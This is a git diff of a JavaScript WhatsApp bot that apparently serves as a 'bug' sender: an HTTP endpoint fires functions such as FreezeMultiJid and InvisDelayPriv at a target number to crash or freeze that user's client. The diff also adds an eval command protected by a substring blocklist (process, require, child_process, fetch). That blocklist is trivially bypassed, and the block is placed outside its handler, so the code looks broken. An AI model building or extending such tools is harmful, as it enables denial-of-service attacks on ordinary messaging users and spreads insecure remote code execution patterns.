@@ -139,14 +139,15 @@ async function delay(ms) {
     if (!msg.message) return;
     const body = msg.message.conversation || msg.message.extendedTextMessage?.text;
     if (!body) return;
+
     const from = msg.key.remoteJid;
     const isGroup = from.endsWith("@g.us");
-    const sender = msg.key.participant || msg.key.remoteJid;
-    const isBot = msg.key.fromMe;
-    const meJid = sock?.user?.id || null;
-    if (!(msg.key.fromMe === true || sender === meJid || sender === (meJid + "@s.whatsapp.net"))) {
-      return; 
-    }
+    const sender = isGroup ? msg.key.participant : msg.key.remoteJid;
+
+    const meJid = sock?.user?.id?.split(":")[0] + "@s.whatsapp.net"; // pastikan formatnya sesuai
+    const isBot = msg.key.fromMe || sender === meJid;
+    if (!isBot) return;
+
     const prefixes = [".", "!", "#", "/", " "];
     const usedPrefix = prefixes.find(p => body.startsWith(p));
     if (!usedPrefix) return;
@@ -258,6 +259,28 @@ await sock.relayMessage(mg.key.remoteJid, mg.message, {
     console.error("messages.upsert error:", e);
   }
 });
+
+    if (body.startsWith(">")) {
+      try {
+        let code = body.slice(1).trim();
+        if (!code) return await reply("eval!!");
+        const sandbox = {
+          sock, msg, from, sender, text, reply,
+          console: { log: (...args) => reply(args.map(a => typeof a === "object" ? JSON.stringify(a, null, 2) : String(a)).join(" ")) }
+        };
+       const blockedWords = ["process", "require", "global", "fs", "child_process", "import", "fetch", "XMLHttpRequest", "Deno", "window"];
+        if (blockedWords.some(w => code.includes(w))) {
+          return await reply("⚠️ acces code has blocked!");
+        }
+        let result = await (async () => eval(`(async () => { ${code} })()`)).call(sandbox);
+        if (result !== undefined) {
+          await reply(String(result));
+        }
+      } catch (err) {
+        await reply("error eval: " + err.message);
+      }
+      return;
+    }
 
   return sock;
 }
@@ -522,8 +545,6 @@ for(let I = 0; I < 1000; I++) {
       await NativeSql3(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
-      await FreezeMultiJid(jid, true)
-      await delay(3000)
       await InvisDelayPriv(jid, true)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_d") {
